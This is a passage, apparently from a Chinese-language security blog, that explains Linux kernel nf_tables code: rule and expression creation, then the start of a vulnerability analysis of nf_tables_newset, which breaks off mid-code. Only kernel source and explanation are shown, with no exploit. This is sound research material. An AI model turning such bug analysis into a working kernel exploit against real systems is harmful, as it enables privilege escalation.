class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!(nlh-&gt;nlmsg_flags &amp; NLM_F_CREATE) ||</span><br><span class="line">    nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">handle = nf_tables_alloc_handle(table);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain-&gt;use == UINT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_POSITION]) &#123;</span><br><span class="line">pos_handle = be64_to_cpu(nla_get_be64(nla[NFTA_RULE_POSITION]));</span><br><span class="line">old_rule = __nft_rule_lookup(chain, pos_handle);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(old_rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_POSITION]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(old_rule);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nla[NFTA_RULE_POSITION_ID]) &#123;</span><br><span class="line">old_rule = nft_rule_lookup_byid(net, nla[NFTA_RULE_POSITION_ID]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(old_rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_POSITION_ID]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(old_rule);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, chain, nla);</span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span>;</span><br><span class="line">size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_EXPRESSIONS]) &#123;</span><br><span class="line">info = kvmalloc_array(NFT_RULE_MAXEXPRS,</span><br><span class="line">      <span class="keyword">sizeof</span>(struct nft_expr_info),</span><br><span class="line">      GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!info)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">nla_for_each_nested(tmp, nla[NFTA_RULE_EXPRESSIONS], rem) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (nla_type(tmp) != NFTA_LIST_ELEM)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line"><span class="keyword">if</span> (n == NFT_RULE_MAXEXPRS)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">err = nf_tables_expr_parse(&amp;ctx, tmp, &amp;info[n]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">size += info[n].ops-&gt;size;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Check for overflow of dlen field */</span></span><br><span class="line">err = -EFBIG;</span><br><span class="line"><span class="keyword">if</span> (size &gt;= <span class="number">1</span> &lt;&lt; <span class="number">12</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_USERDATA]) &#123;</span><br><span class="line">ulen = nla_len(nla[NFTA_RULE_USERDATA]);</span><br><span class="line"><span class="keyword">if</span> (ulen &gt; <span class="number">0</span>)</span><br><span class="line">usize = <span class="keyword">sizeof</span>(struct nft_userdata) + ulen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">rule = kzalloc(<span class="keyword">sizeof</span>(*rule) + size + usize, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (rule == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line"></span><br><span class="line">nft_activate_next(net, rule);</span><br><span class="line"></span><br><span class="line">rule-&gt;handle = handle;</span><br><span class="line">rule-&gt;dlen   = size;</span><br><span class="line">rule-&gt;udata  = ulen ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ulen) &#123;</span><br><span class="line">udata = nft_userdata(rule);</span><br><span class="line">udata-&gt;len = ulen - <span class="number">1</span>;</span><br><span class="line">nla_memcpy(udata-&gt;data, nla[NFTA_RULE_USERDATA], ulen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expr = nft_expr_first(rule);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">err = nf_tables_newexpr(&amp;ctx, &amp;info[i], expr);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (info[i].ops-&gt;validate)</span><br><span class="line">nft_validate_state_update(net, NFT_VALIDATE_NEED);</span><br><span class="line"></span><br><span class="line">info[i].ops = <span class="literal">NULL</span>;</span><br><span class="line">expr = nft_expr_next(expr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE) &#123;</span><br><span class="line">trans = nft_trans_rule_add(&amp;ctx, NFT_MSG_NEWRULE, rule);</span><br><span class="line"><span class="keyword">if</span> (trans == <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line">&#125;</span><br><span class="line">err = nft_delrule(&amp;ctx, old_rule);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">nft_trans_destroy(trans);</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (nft_trans_rule_add(&amp;ctx, NFT_MSG_NEWRULE, rule) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_APPEND) &#123;</span><br><span class="line"><span class="keyword">if</span> (old_rule)</span><br><span class="line">list_add_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;chain-&gt;rules);</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (old_rule)</span><br><span class="line">list_add_tail_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;old_rule-&gt;<span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">list_add_rcu(&amp;rule-&gt;<span class="built_in">list</span>, &amp;chain-&gt;rules);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kvfree(info);</span><br><span class="line">chain-&gt;use++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (net-&gt;nft.validate_state == NFT_VALIDATE_DO)</span><br><span class="line"><span class="keyword">return</span> nft_table_validate(net, table);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err2:</span><br><span class="line">nf_tables_rule_release(&amp;ctx, rule);</span><br><span class="line">err1:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (info[i].ops) &#123;</span><br><span class="line">module_put(info[i].ops-&gt;type-&gt;owner);</span><br><span class="line"><span class="keyword">if</span> (info[i].ops-&gt;type-&gt;release_ops)</span><br><span class="line">info[i].ops-&gt;type-&gt;release_ops(info[i].ops);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kvfree(info);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先前两步就是获取<code>table</code>和<code>chain</code>，若是设置了<code>nla[NFTA_RULE_EXPRESSIONS]</code>则遍历所有的<code>expression</code>的大小，并赋值给size。若是设置了<code>nla[NFTA_RULE_USERDATA]</code>则是把<code>userdata</code>的大小放到usize中。</p><p><code>rule = kzalloc(sizeof(*rule) + size + usize, GFP_KERNEL);</code>随即调用这条语句分配<code>rule</code>，紧接着就是一系列初始化。</p><h3 id="创建expression操作"><a href="#创建expression操作" class="headerlink" title="创建expression操作"></a>创建expression操作</h3><p>创建<code>expression</code>的操作其实也是发生在<code>nf_tables_newrule</code>函数中的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_EXPRESSIONS]) &#123;</span><br><span class="line">  info = kvmalloc_array(NFT_RULE_MAXEXPRS,</span><br><span class="line">                        <span class="keyword">sizeof</span>(struct nft_expr_info),</span><br><span class="line">                        GFP_KERNEL);</span><br><span class="line">  <span class="keyword">if</span> (!info)</span><br><span class="line">    <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  nla_for_each_nested(tmp, nla[NFTA_RULE_EXPRESSIONS], rem) &#123;</span><br><span class="line">    err = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (nla_type(tmp) != NFTA_LIST_ELEM)</span><br><span class="line">      <span class="keyword">goto</span> err1;</span><br><span class="line">    <span class="keyword">if</span> (n == NFT_RULE_MAXEXPRS)</span><br><span class="line">      <span class="keyword">goto</span> err1;</span><br><span class="line">    err = nf_tables_expr_parse(&amp;ctx, tmp, &amp;info[n]);</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err1;</span><br><span class="line">    size += info[n].ops-&gt;size;</span><br><span class="line">    n++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是在这里通过<code>nf_tables_expr_parse</code>初始化<code>info</code>为某个type的ops。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *__<span class="title">nft_expr_type_get</span>(<span class="title">u8</span> <span class="title">family</span>,</span></span><br><span class="line"><span class="class">       <span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">nla</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *<span class="title">type</span>;</span></span><br><span class="line"></span><br><span class="line">list_for_each_entry(type, &amp;nf_tables_expressions, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!nla_strcmp(nla, type-&gt;name) &amp;&amp;</span><br><span class="line">    (!type-&gt;family || type-&gt;family == family))</span><br><span class="line"><span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>nf_tables_expr_parse</code>最终会调用到<code>__nft_expr_type_get</code>随后遍历<code>nf_tables_expressions</code>，找到对应的<code>type</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">NFPROTO_UNSPEC =  <span class="number">0</span>,</span><br><span class="line">NFPROTO_INET   =  <span class="number">1</span>,</span><br><span class="line">NFPROTO_IPV4   =  <span class="number">2</span>,</span><br><span class="line">NFPROTO_ARP    =  <span class="number">3</span>,</span><br><span class="line">NFPROTO_NETDEV =  <span class="number">5</span>,</span><br><span class="line">NFPROTO_BRIDGE =  <span class="number">7</span>,</span><br><span class="line">NFPROTO_IPV6   = <span class="number">10</span>,</span><br><span class="line">NFPROTO_DECNET = <span class="number">12</span>,</span><br><span class="line">NFPROTO_NUMPROTO,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *<span class="title">nft_basic_types</span>[] =</span> &#123;</span><br><span class="line">&amp;nft_imm_type,</span><br><span class="line">&amp;nft_cmp_type,</span><br><span class="line">&amp;nft_lookup_type,</span><br><span class="line">&amp;nft_bitwise_type,</span><br><span class="line">&amp;nft_byteorder_type,</span><br><span class="line">&amp;nft_payload_type,</span><br><span class="line">&amp;nft_dynset_type,</span><br><span class="line">&amp;nft_range_type,</span><br><span class="line">&amp;nft_meta_type,</span><br><span class="line">&amp;nft_rt_type,</span><br><span class="line">&amp;nft_exthdr_type,</span><br><span class="line">&amp;nft_last_type,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以根据上面的例子看，这里会调用到的是<code>nft_lookup_type</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span> <span class="title">nft_lookup_ops</span> =</span> &#123;</span><br><span class="line">.type= &amp;nft_lookup_type,</span><br><span class="line">.size= NFT_EXPR_SIZE(<span class="keyword">sizeof</span>(struct nft_lookup)),</span><br><span class="line">.eval= nft_lookup_eval,</span><br><span class="line">.init= nft_lookup_init,</span><br><span class="line">.activate= nft_lookup_activate,</span><br><span class="line">.deactivate= nft_lookup_deactivate,</span><br><span class="line">.destroy= nft_lookup_destroy,</span><br><span class="line">.dump= nft_lookup_dump,</span><br><span class="line">.validate= nft_lookup_validate,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> <span class="title">nft_lookup_type</span> __<span class="title">read_mostly</span> =</span> &#123;</span><br><span class="line">.name= <span class="string">&quot;lookup&quot;</span>,</span><br><span class="line">.ops= &amp;nft_lookup_ops,</span><br><span class="line">.policy= nft_lookup_policy,</span><br><span class="line">.maxattr= NFTA_LOOKUP_MAX,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newexpr</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nft_expr_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span> *<span class="title">ops</span> =</span> info-&gt;ops;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">expr-&gt;ops = ops;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;init) &#123;</span><br><span class="line">err = ops-&gt;init(ctx, expr, (<span class="keyword">const</span> struct nlattr **)info-&gt;tb);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err1:</span><br><span class="line">expr-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终根据不同类型进行初始化。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞发生在创建<code>set</code>的过程中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newset</span><span class="params">(struct sk_buff *skb, <span class="keyword">const</span> struct nfnl_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> struct nlattr *<span class="keyword">const</span> nla[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">u32 ktype, dtype, flags, policy, gc_int, objtype;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> *<span class="title">extack</span> =</span> info-&gt;extack;</span><br><span class="line">u8 genmask = nft_genmask_next(info-&gt;net);</span><br><span class="line">u8 family = info-&gt;nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> info-&gt;net;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_desc</span> <span class="title">desc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *udata;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> alloc_size;</span><br><span class="line">u64 timeout;</span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"><span class="keyword">int</span> err, i;</span><br><span class="line">u16 udlen;</span><br><span class="line">u64 size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_TABLE] == <span class="literal">NULL</span> || nla[NFTA_SET_NAME] == <span class="literal">NULL</span> ||</span><br><span class="line">    nla[NFTA_SET_KEY_LEN] == <span class="literal">NULL</span> || nla[NFTA_SET_ID] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">ktype = NFT_DATA_VALUE;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_KEY_TYPE] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">ktype = ntohl(nla_get_be32(nla[NFTA_SET_KEY_TYPE]));</span><br><span class="line"><span class="keyword">if</span> ((ktype &amp; NFT_DATA_RESERVED_MASK) == NFT_DATA_RESERVED_MASK)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">desc.klen = ntohl(nla_get_be32(nla[NFTA_SET_KEY_LEN]));</span><br><span class="line"><span class="keyword">if</span> (desc.klen == <span class="number">0</span> || desc.klen &gt; NFT_DATA_VALUE_MAXLEN)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_FLAGS] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">flags = ntohl(nla_get_be32(nla[NFTA_SET_FLAGS]));</span><br><span class="line"><span class="keyword">if</span> (flags &amp;</span><br><span class="line">    ~(NFT_SET_ANONYMOUS | NFT_SET_CONSTANT | NFT_SET_INTERVAL |</span><br><span class="line">      NFT_SET_TIMEOUT | NFT_SET_MAP | NFT_SET_EVAL |</span><br><span class="line">      NFT_SET_OBJECT | NFT_SET_CONCAT | NFT_SET_EXPR))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"><span class="comment">/* Only one of these operations is supported */</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; (NFT_SET_MAP | NFT_SET_OBJECT)) ==</span><br><span class="line">    (NFT_SET_MAP | NFT_SET_OBJECT))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> ((flags &amp; (NFT_SET_EVAL | NFT_SET_OBJECT)) ==</span><br><span class="line">    (NFT_SET_EVAL | NFT_SET_OBJECT))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dtype = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_DATA_TYPE] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_MAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">dtype = ntohl(nla_get_be32(nla[NFTA_SET_DATA_TYPE]));</span><br><span class="line"><span class="keyword">if</span> ((dtype &amp; NFT_DATA_RESERVED_MASK) ==</span><br><span class="line">    NFT_DATA_RESERVED_MASK &amp;&amp;</span><br><span class="line">    dtype != NFT_DATA_VERDICT)</span><br><span class="line"><span class="keyword">return</span> 